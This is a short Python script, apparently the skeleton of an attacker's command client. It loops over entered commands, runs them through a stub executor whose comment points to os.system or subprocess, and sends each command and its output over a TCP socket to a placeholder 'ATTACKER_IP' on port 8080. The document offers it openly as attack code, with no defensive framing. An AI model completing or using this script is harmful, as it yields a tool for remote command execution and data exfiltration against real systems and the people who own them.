import socket

def execute_command(command):
    # Replace with actual command execution method (e.g., os.system(), subprocess.Popen())
    return f"Executed: {command}"

def send_data_to_server(data):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('ATTACKER_IP', 8080))
        s.sendall(str.encode(data + '\n'))
        data = s.recv(1024).decode('utf-8')
        return data
    except Exception as e:
        print(f"Error: {e}")
    finally:
        s.close()

def receive_commands():
    while True:
        command = input("Enter command or 'exit' to quit:")
        if command.lower() == "exit":
            break
        output = execute_command(command)
        new_data = f"{command}={output}"
        send_data_to_server(new_data)

if __name__ == "__main__":
    receive_commands()
